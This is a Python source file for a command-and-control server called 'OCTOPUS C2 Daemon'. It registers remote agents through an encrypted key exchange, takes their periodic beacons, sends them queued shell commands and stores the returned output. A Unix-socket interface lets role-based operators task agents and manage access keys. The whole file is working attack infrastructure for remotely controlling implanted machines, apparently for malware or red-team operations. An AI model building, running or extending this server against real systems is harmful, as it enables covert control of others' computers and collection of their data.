
import base64
import json
import os
import secrets
import socket
import sys
import threading
import uuid
from typing import Any

try:
    import uvicorn
    from fastapi import FastAPI, HTTPException, Request
    FASTAPI_OK = True
except ImportError:
    FASTAPI_OK = False

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from core.c2.crypto_engine import C2CryptoEngine
from core.c2.db_backend import C2Database
from core.c2.enrollment import EnrollmentAuthority
from core.c2.event_store import EventStore
from core.c2.key_store import KeyStore
from core.c2.operators import OperatorManager

# ─── Configuration ───────────────────────────────────────
BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
DATA_DIR = os.path.abspath(
    os.environ.get("OCTOPUS_DATA_DIR", os.path.join(BASE_DIR, "data"))
)
KEY_DIR  = os.path.join(DATA_DIR, "keys")
DB_PATH  = os.path.join(DATA_DIR, "c2.db")
SOCK_FILE = os.environ.get("OCTOPUS_C2_SOCKET", "/tmp/octopus.sock")
KEYSTORE_PASSPHRASE_FILE = os.path.join(KEY_DIR, "keystore.passphrase")
ENROLLMENT_KEY_FILE = os.path.join(KEY_DIR, "enrollment.key")
MAX_REGISTER_BODY = 64 * 1024
MAX_BEACON_BODY = 1024 * 1024
MAX_RESULTS_PER_BEACON = 100
MAX_RESULT_BYTES = 256 * 1024

# Ensure directories exist BEFORE initializing components
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(KEY_DIR, exist_ok=True)
os.chmod(DATA_DIR, 0o700)
os.chmod(KEY_DIR, 0o700)


def _load_or_create_keystore_passphrase() -> str:
    configured = os.environ.get("OCTOPUS_C2_KEY_PASSPHRASE", "")
    if configured:
        if len(configured) < 16:
            raise RuntimeError("OCTOPUS_C2_KEY_PASSPHRASE must be at least 16 characters")
        return configured
    if os.path.exists(KEYSTORE_PASSPHRASE_FILE):
        os.chmod(KEYSTORE_PASSPHRASE_FILE, 0o600)
        with open(KEYSTORE_PASSPHRASE_FILE, encoding="utf-8") as handle:
            value = handle.read().strip()
        if len(value) < 32:
            raise RuntimeError("invalid local KeyStore passphrase file")
        return value

    value = secrets.token_urlsafe(48)
    descriptor = os.open(
        KEYSTORE_PASSPHRASE_FILE,
        os.O_WRONLY | os.O_CREAT | os.O_EXCL,
        0o600,
    )
    with os.fdopen(descriptor, "w", encoding="utf-8") as handle:
        handle.write(value)
        handle.flush()
        os.fsync(handle.fileno())
    return value

# ─── Initialize Components ──────────────────────────────
key_store = KeyStore(key_dir=KEY_DIR)
_key_passphrase = _load_or_create_keystore_passphrase()
if key_store.exists():
    if not key_store.unlock(_key_passphrase):
        raise RuntimeError("unable to unlock C2 KeyStore")
else:
    key_store.generate(_key_passphrase)
del _key_passphrase

crypto = C2CryptoEngine(
    key_dir=KEY_DIR,
    private_key=key_store.get_or_create_x25519_private_key(),
)
db = C2Database(db_path=DB_PATH)
events = EventStore(db_path=DB_PATH)
operators = OperatorManager(db_path=DB_PATH)
enrollment = EnrollmentAuthority(ENROLLMENT_KEY_FILE)

if not FASTAPI_OK:
    print("[!] FATAL: fastapi/uvicorn not installed.  pip install fastapi uvicorn")
    sys.exit(1)

app = FastAPI(title="OCTOPUS C2 Daemon", version="11.0", docs_url=None, redoc_url=None)


# ─── Event Handlers (Projections) ────────────────────────

def _on_agent_registered(event):
    """Projection: update agents table from registration event."""
    p = event.payload
    db.register_agent(
        agent_id=p["agent_id"],
        hostname=p.get("hostname", "Unknown"),
        os_name=p.get("os", "Unknown"),
        user=p.get("user", "Unknown"),
        ip=p.get("ip", "Unknown"),
        crypto_state=p.get("crypto_state")
    )

def _on_task_queued(event):
    """Projection: insert task into tasks table."""
    p = event.payload
    db.queue_task(p["task_id"], p["agent_id"], p["command"])

# Subscribe handlers
events.subscribe("agent.registered", _on_agent_registered)
events.subscribe("task.queued", _on_task_queued)


# ─── Agent-Facing HTTP Endpoints ─────────────────────────

def _load_agent_crypto(agent_id: str) -> bool:
    """Load crypto state from DB into memory if daemon restarted."""
    if agent_id not in crypto.agent_state:
        state = db.get_agent_crypto(agent_id)
        if isinstance(state, str):
            try:
                state = key_store.unseal_json(state, aad=agent_id.encode("utf-8"))
            except Exception:
                return False
        if isinstance(state, dict) and "key" in state:
            crypto.agent_state[agent_id] = {
                "key": bytes.fromhex(state["key"]),
                "rx_seq": state.get("rx_seq", 0),
                "tx_seq": state.get("tx_seq", 0),
            }
            if not isinstance(db.get_agent_crypto(agent_id), str):
                sealed = key_store.seal_json(state, aad=agent_id.encode("utf-8"))
                db.update_agent_crypto(agent_id, sealed)
            return True
        return False
    return True


def _sealed_agent_crypto(agent_id: str) -> str:
    state = crypto.agent_state[agent_id]
    return key_store.seal_json(
        {
            "key": state["key"].hex(),
            "rx_seq": state["rx_seq"],
            "tx_seq": state["tx_seq"],
        },
        aad=agent_id.encode("utf-8"),
    )


async def _read_json_limited(request: Request, limit: int) -> dict[str, Any]:
    content_length = request.headers.get("content-length")
    if content_length:
        try:
            if int(content_length) > limit:
                raise HTTPException(status_code=413, detail="Request too large")
        except ValueError as exc:
            raise HTTPException(status_code=400, detail="Invalid Content-Length") from exc
    raw = await request.body()
    if len(raw) > limit:
        raise HTTPException(status_code=413, detail="Request too large")
    try:
        value = json.loads(raw)
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        raise HTTPException(status_code=400, detail="Invalid JSON") from exc
    if not isinstance(value, dict):
        raise HTTPException(status_code=400, detail="JSON object required")
    return value


@app.post("/register")
async def register_agent(request: Request):
    """X25519 Registration endpoint with HKDF key derivation."""
    body = await _read_json_limited(request, MAX_REGISTER_BODY)
    b64_client_pub = body.get("client_pub")
    encrypted_data = body.get("data")
    enrollment_token = body.get("enrollment_token")

    if not b64_client_pub or not encrypted_data or not enrollment_token:
        raise HTTPException(status_code=400, detail="Missing crypto payload")

    temp_id = f"registration:{uuid.uuid4().hex}"
    try:
        client_pub_bytes = base64.b64decode(b64_client_pub, validate=True)
        if len(client_pub_bytes) != 32:
            raise ValueError("invalid client key")
        if not enrollment.consume(str(enrollment_token), db):
            raise HTTPException(status_code=401, detail="Enrollment denied")
        shared_key = crypto.derive_shared_key(client_pub_bytes)

        crypto.agent_state[temp_id] = {"key": shared_key, "rx_seq": 0, "tx_seq": 0}

        raw_data = crypto.decrypt_aes_gcm(temp_id, encrypted_data)
        data = json.loads(raw_data)
        if not isinstance(data, dict):
            raise ValueError("invalid registration data")
        real_agent_id = f"AGT-{uuid.uuid4().hex}"

        crypto.agent_state[real_agent_id] = crypto.agent_state.pop(temp_id)
        resp_data = {
            "status": "ok",
            "agent_id": real_agent_id,
            "interval": 60,
            "jitter": 20,
        }
        resp_enc = crypto.encrypt_aes_gcm(real_agent_id, json.dumps(resp_data))
        sealed_state = _sealed_agent_crypto(real_agent_id)
        events.append("agent", real_agent_id, "agent.registered", {
            "agent_id": real_agent_id,
            "hostname": data.get("hostname"),
            "os": data.get("os"),
            "user": data.get("user"),
            "ip": request.client.host,
            "crypto_state": sealed_state,
        })
        if db.get_agent_crypto(real_agent_id) != sealed_state:
            crypto.agent_state.pop(real_agent_id, None)
            raise RuntimeError("agent projection failed")
        return {"data": resp_enc}

    except HTTPException:
        raise
    except Exception as exc:
        raise HTTPException(status_code=400, detail="Registration failed") from exc
    finally:
        crypto.agent_state.pop(temp_id, None)


@app.post("/beacon")
async def beacon(request: Request):
    """Beaconing endpoint."""
    body = await _read_json_limited(request, MAX_BEACON_BODY)
    encrypted_data = body.get("data")
    if not isinstance(encrypted_data, str):
        raise HTTPException(status_code=400, detail="Missing encrypted payload")

    agent_id = request.headers.get("Agent-ID")
    if not agent_id or not _load_agent_crypto(agent_id):
        raise HTTPException(status_code=401, detail="Agent not found")

    try:
        raw = crypto.decrypt_aes_gcm(agent_id, encrypted_data)
        decrypted = json.loads(raw)

        # Publish beacon event
        events.append("agent", agent_id, "agent.beacon", {
            "ip": request.client.host,
        })

        # Sync crypto state to DB
        crypto.agent_state[agent_id]
        sealed_state = _sealed_agent_crypto(agent_id)
        if not db.update_agent_seen(
            agent_id=agent_id,
            hostname=decrypted.get("hostname", "Unknown"),
            os_name=decrypted.get("os", "Unknown"),
            user=decrypted.get("user", "Unknown"),
            ip=request.client.host,
            crypto_state=sealed_state,
        ):
            raise HTTPException(status_code=401, detail="Agent not found")

        acknowledgements = decrypted.get("acks") or []
        if (
            not isinstance(acknowledgements, list)
            or len(acknowledgements) > MAX_RESULTS_PER_BEACON
            or any(
                not isinstance(task_id, str) or not task_id or len(task_id) > 64
                for task_id in acknowledgements
            )
        ):
            raise HTTPException(status_code=400, detail="Invalid task acknowledgements")
        if acknowledgements:
            accepted = db.acknowledge_tasks(agent_id, acknowledgements)
            if accepted != len(set(acknowledgements)):
                raise HTTPException(status_code=409, detail="One or more acknowledgements were rejected")

        # Process results
        results = decrypted.get("results") or []
        if not isinstance(results, list) or len(results) > MAX_RESULTS_PER_BEACON:
            raise HTTPException(status_code=413, detail="Too many results")
        if results:
            rejected = []
            for res in results:
                if not isinstance(res, dict):
                    rejected.append("")
                    continue
                task_id = str(res.get("task_id", ""))
                output = str(res.get("output", ""))
                error = str(res.get("error", ""))
                if (
                    not task_id
                    or len(task_id) > 64
                    or len(output.encode("utf-8")) > MAX_RESULT_BYTES
                    or len(error.encode("utf-8")) > MAX_RESULT_BYTES
                ):
                    rejected.append(task_id)
                    continue
                if not db.update_task_result(task_id, agent_id, output, error):
                    rejected.append(task_id)
                    continue
                events.append("task", res["task_id"], "task.completed", {
                    "task_id": task_id,
                    "agent_id": agent_id,
                    "status": "error" if error else "completed",
                })
            if rejected:
                raise HTTPException(status_code=409, detail="One or more task results were rejected")

        pending = db.get_pending_tasks(agent_id)

        resp_data = {"tasks": pending}
        resp_enc = crypto.encrypt_aes_gcm(agent_id, json.dumps(resp_data))
        if not db.update_agent_crypto(agent_id, _sealed_agent_crypto(agent_id)):
            raise HTTPException(status_code=401, detail="Agent not found")
        return {"data": resp_enc}
    except HTTPException:
        raise
    except Exception as exc:
        raise HTTPException(status_code=400, detail="Invalid beacon") from exc


# ─── Operator IPC Control Plane ──────────────────────────

def handle_client(conn):
    """Handle IPC requests from octopus.py thin client."""
    try:
        while True:
            data = conn.recv(8192)
            if not data:
                break

            req = json.loads(data.decode('utf-8'))
            action = req.get("action")
            api_key = req.get("api_key", "")

            # Authenticate
            operator = operators.authenticate(api_key)
            if not operator and action != "ping":
                resp = {"status": "error", "msg": "Authentication failed"}
                conn.sendall(json.dumps(resp).encode('utf-8'))
                continue

            # Authorize
            if operator and not operators.authorize(operator, action):
                resp = {"status": "error", "msg": f"Permission denied: {operator['role']} cannot {action}"}

                # Audit denied action
                events.append("operator", operator["operator_id"], "operator.denied", {
                    "action": action,
                    "operator": operator["name"],
                    "role": operator["role"],
                })

                conn.sendall(json.dumps(resp).encode('utf-8'))
                continue

            # ─── Actions ─────────────────────────────
            if action == "ping":
                resp = {"status": "ok", "msg": "pong", "version": "10.0"}

            elif action == "list_agents":
                agents_list = db.get_all_agents()
                agents_dict = {a["agent_id"]: a for a in agents_list}
                resp = {"status": "ok", "agents": agents_dict}

            elif action == "queue_task":
                agent_id = req.get("agent_id")
                command = req.get("command")

                if db.get_agent_crypto(agent_id):
                    task_id = uuid.uuid4().hex

                    # Publish event (projection handles DB insert)
                    events.append("task", task_id, "task.queued", {
                        "task_id": task_id,
                        "agent_id": agent_id,
                        "command": command,
                        "operator": operator["name"] if operator else "unknown",
                    })

                    resp = {"status": "ok", "task_id": task_id}
                else:
                    resp = {"status": "error", "msg": "Agent not found"}

            elif action == "get_results":
                agent_id = req.get("agent_id")
                results = db.get_results(agent_id)
                resp = {"status": "ok", "results": results}

            elif action == "manage_operators":
                sub_action = req.get("sub_action")
                if sub_action == "list":
                    resp = {"status": "ok", "operators": operators.list_operators()}
                elif sub_action == "create":
                    name = req.get("name")
                    role = req.get("role", "operator")
                    try:
                        new_key = operators.create_operator(name, role)
                        resp = {"status": "ok", "api_key": new_key}
                    except Exception as e:
                        resp = {"status": "error", "msg": str(e)}
                elif sub_action == "deactivate":
                    name = req.get("name")
                    if operators.deactivate_operator(name):
                        resp = {"status": "ok"}
                    else:
                        resp = {"status": "error", "msg": "Operator not found"}
                elif sub_action == "rotate_key":
                    name = req.get("name")
                    new_key = operators.rotate_api_key(name)
                    if new_key:
                        resp = {"status": "ok", "api_key": new_key}
                    else:
                        resp = {"status": "error", "msg": "Operator not found"}
                else:
                    resp = {"status": "error", "msg": f"Unknown sub_action: {sub_action}"}

            else:
                resp = {"status": "error", "msg": f"Unknown action: {action}"}

            # Audit successful action
            if operator and action != "ping":
                events.append("operator", operator["operator_id"], "operator.action", {
                    "action": action,
                    "operator": operator["name"],
                })

            conn.sendall(json.dumps(resp).encode('utf-8'))
    except Exception as e:
        print(f"[IPC] Socket error: {e}")
    finally:
        conn.close()


def run_socket_server():
    """Unix Domain Socket control plane."""
    # Remove stale socket
    if os.path.exists(SOCK_FILE):
        try:
            # Test if something is actually listening
            test_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            test_sock.settimeout(1)
            test_sock.connect(SOCK_FILE)
            test_sock.close()
            # Something is listening — another daemon is running
            print(f"[!] Another daemon is already listening on {SOCK_FILE}")
            sys.exit(1)
        except (ConnectionRefusedError, OSError):
            # Stale socket — safe to remove
            os.remove(SOCK_FILE)

    server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    server.bind(SOCK_FILE)
    server.listen(5)
    os.chmod(SOCK_FILE, 0o600)

    print(f"[*] Control Plane listening on {SOCK_FILE}")
    while True:
        conn, _ = server.accept()
        threading.Thread(target=handle_client, args=(conn,), daemon=True).start()


# ─── Main ────────────────────────────────────────────────

def main():
    # Ensure at least one operator exists (bootstrap)
    if not operators.list_operators():
        print("[*] No operators found — creating default admin...")
        try:
            admin_key = operators.create_operator("admin", "admin")
            key_file = os.path.join(DATA_DIR, "default_admin.key")
            with open(key_file, "w") as f:
                f.write(admin_key)
            os.chmod(key_file, 0o600)
            print(f"[+] Admin operator created. Key saved to {key_file}")
        except Exception as e:
            print(f"[!] Warning: Could not create default operator: {e}")

    sock_thread = threading.Thread(target=run_socket_server, daemon=True)
    sock_thread.start()

    host = os.environ.get("OCTOPUS_C2_HOST", "127.0.0.1")
    try:
        port = int(os.environ.get("OCTOPUS_C2_PORT", "8443"))
    except ValueError as exc:
        raise RuntimeError("OCTOPUS_C2_PORT must be an integer") from exc
    if not 1 <= port <= 65535:
        raise RuntimeError("OCTOPUS_C2_PORT is outside the valid range")

    print(f"[*] Starting OCTOPUS C2 Daemon v11.0 on {host}:{port}")
    print(f"[*] Event Store: {DB_PATH}")
    print(f"[*] RBAC: {len(operators.list_operators())} operator(s)")

    try:
        uvicorn.run(app, host=host, port=port, log_level="warning")
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"[!] Port {port} already in use. Kill existing process or change port.")
        else:
            raise


if __name__ == "__main__":
    main()
